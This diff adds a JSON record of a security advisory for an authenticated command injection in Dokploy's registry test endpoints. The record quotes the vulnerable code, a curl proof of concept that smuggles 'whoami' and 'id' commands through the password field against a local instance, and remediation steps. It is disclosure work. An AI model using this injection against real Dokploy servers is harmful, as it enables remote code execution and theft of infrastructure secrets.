@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-w6r4-f26v-8g36",
+  "repo": {
+    "cve_id": "CVE-2026-72902",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\nAn authenticated command injection vulnerability in Dokploy's registry test API endpoints allows arbitrary command execution on the target server (local host or remote server via SSH).\r\nAny authenticated user who can call `registry.testRegistry` can inject shell metacharacters through the `password` field and achieve remote code execution.\r\n\r\n## Details\r\nAffected file:\r\n- `apps/dokploy/server/api/routers/registry.ts`\r\n\r\nVulnerable code paths:\r\n\r\n`testRegistry`:\r\n```ts\r\nawait execAsyncRemote(\r\n  input.serverId,\r\n  `echo ${input.password} | docker ${args.join(\" \")}`,\r\n);\r\n```\r\n\r\n`testRegistryById`:\r\n```ts\r\nawait execAsyncRemote(\r\n  input.serverId,\r\n  `echo ${registryData.password} | docker ${args.join(\" \")}`,\r\n);\r\n```\r\n\r\nRoot cause:\r\n- User-controlled input is directly interpolated into a shell command string.\r\n- `password` is only validated as `z.string().min(1)` (no shell-safe escaping).\r\n- Endpoint uses `protectedProcedure` (authenticated), not admin-only.\r\n\r\nWhy this appears unintended:\r\n- A safer helper exists in `packages/server/src/services/registry.ts` (`safeDockerLoginCommand`) but is not used in these test endpoints.\r\n- Prior hardening commits in registry code indicate shell safety is a design goal.\r\n\r\nThis issue is distinct from GHSA-vx6x-6559-x35r / CVE-2026-24841, which affected `/docker-container-terminal` WebSocket handling.\r\n\r\n## PoC\r\n1. Authenticate:\r\n```bash\r\ncurl -sS -c /tmp/cookies.txt \\\r\n  -X POST http://127.0.0.1:3900/api/auth/sign-in/email \\\r\n  -H 'content-type: application/json' \\\r\n  --data '{\"email\":\"owner@example.com\",\"password\":\"OwnerPass123!\"}'\r\n```\r\n\r\n2. Trigger command injection via `registry.testRegistry`:\r\n```bash\r\ncurl -sS -b /tmp/cookies.txt \\\r\n  -X POST http://127.0.0.1:3900/api/trpc/registry.testRegistry \\\r\n  -H 'content-type: application/json' \\\r\n  --data '{\"json\":{\"username\":\"attacker\",\"password\":\"pw123; whoami > /tmp/dokploy_ci_whoami; id > /tmp/dokploy_ci_id; #\",\"registryUrl\":\"registry.example\",\"registryType\":\"cloud\",\"serverId\":\"labsrv1\"}}'\r\n```\r\n\r\n3. Verify command execution on target server:\r\n```bash\r\ncat /tmp/dokploy_ci_whoami\r\ncat /tmp/dokploy_ci_id\r\n```\r\n\r\nObserved result (example):\r\n- `doktest`\r\n- `uid=1000(doktest) gid=1000(users) ...`\r\n- \r\nProof of exploitation\r\n\r\nThe injected payload executed successfully on the target server and wrote\r\ncommand output to files under /tmp. The screenshot below shows the PoC\r\nscript triggering the vulnerability and verifying command execution via\r\nwhoami and id.\r\n\r\n<img width=\"826\" height=\"207\" alt=\"image\" src=\"https://github.com/user-attachments/assets/32f85fad-4f35-4236-9396-36bedc967c2b\" />\r\n\r\n\r\n## Impact\r\n- Authenticated remote code execution on deployment targets.\r\n- Potential compromise of application secrets, credentials, and infrastructure.\r\n- Lateral movement and full environment takeover are possible depending on host privileges.\r\n\r\n ##Suggested remediation\r\n\r\n  1. Eliminate shell interpolation in registry test endpoints\r\n  - In `apps/dokploy/server/api/routers/registry.ts`, replace remote command construction:\r\n    - From:\r\n      - `` `echo ${input.password} | docker ${args.join(\" \")}` ``\r\n      - `` `echo ${registryData.password} | docker ${args.join(\" \")}` ``\r\n    - To:\r\n      - Reuse a safe helper that properly escapes inputs (for example `safeDockerLoginCommand` from `packages/server/src/services/registry.ts`), or\r\n      - Prefer a non-shell execution path with argument arrays and stdin where possible.\r\n\r\n  2. Restrict endpoint privileges\r\n  - Change both `testRegistry` and `testRegistryById` from `protectedProcedure` to `adminProcedure` so only `owner/admin` can execute remote docker login checks.\r\n\r\n  3. Enforce server ownership authorization\r\n  - Before `execAsyncRemote(input.serverId, ...)`, validate that `serverId` belongs to `ctx.session.activeOrganizationId`.\r\n  - Reject requests where server ownership does not match the caller’s active organization.\r\n\r\n  4. Harden input validation\r\n  - Add strict validation for `registryUrl`, `username`, and any command-bound strings to disallow shell metacharacters if shell execution remains anywhere.\r\n  - Treat `serverId` and similar IDs as strict identifiers (already existing object ownership checks should be mandatory).\r\n\r\n  5. Add regression tests\r\n  - Add tests that submit payloads with shell metacharacters (e.g. `;`, `&&`, `` ` ``, `$()`) and assert they are not executed.\r\n  - Add authorization tests proving non-admin users cannot invoke registry test execution.\r\n  - Add org-boundary tests proving users cannot target servers outside their organization.",
+    "ghsa_id": "GHSA-w6r4-f26v-8g36",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-w6r4-f26v-8g36",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-w6r4-f26v-8g36"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72902"
+      }
+    ],
+    "published_at": "2026-07-21T23:26:16Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated RCE via Command Injection in registry.testRegistry / registry.testRegistryById",
+    "updated_at": "2026-08-10T19:40:46Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= v0.28.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
